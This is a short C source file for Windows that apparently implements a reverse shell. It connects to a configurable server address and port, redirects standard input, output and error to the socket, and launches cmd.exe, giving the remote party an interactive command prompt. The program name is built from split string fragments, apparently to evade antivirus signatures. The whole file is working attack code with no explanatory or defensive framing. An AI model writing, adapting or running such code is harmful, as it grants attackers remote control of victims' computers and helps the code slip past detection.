#include <stdio.h>
#include <WinSock2.h>
#include <string.h>
#include <WS2tcpip.h>
#include <windows.h>
#pragma comment (lib,"ws2_32.lib")

int main(int argc,char* argv[]){
    SOCKET client_socket;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    int connection;
    struct sockaddr_in client_addr;
    char ip_addr[] = "192.168.1.1"; //Add your server ip
    char data[4096]; 
    int port = 1337; // Add tour server port

    WSADATA wsadata;
    WSAStartup(MAKEWORD(2,2),&wsadata); //Initialize WinSock
    client_socket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL); //Create a TCP socket
    client_addr.sin_port = htons(port);
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(client_socket,(SOCKADDR*)&client_addr,sizeof(client_addr),NULL,NULL,NULL,NULL); //Connect to the target server
    if (connection == SOCKET_ERROR){
        printf("Connection Error to the server:%lu",WSAGetLastError());
        WSACleanup();
        exit(0);
        return 1;
    }

    recv(client_socket,data,sizeof(data),0);
    memset(&si,0,sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client_socket; //pipe std error/output/input

    char b[3] = "cm";   
    char c[4] = "d.e";  
    char d[3] = "xe"; 
    char e[10]; 
    e[0] = '\0';

    strcat(e, b);
    strcat(e, c);
    strcat(e, d);

    CreateProcess(NULL,e,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi); //Spawn Command Prompt
    WaitForSingleObject(pi.hProcess,INFINITE);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    memset(data,0,sizeof(data));
    return 0;

}
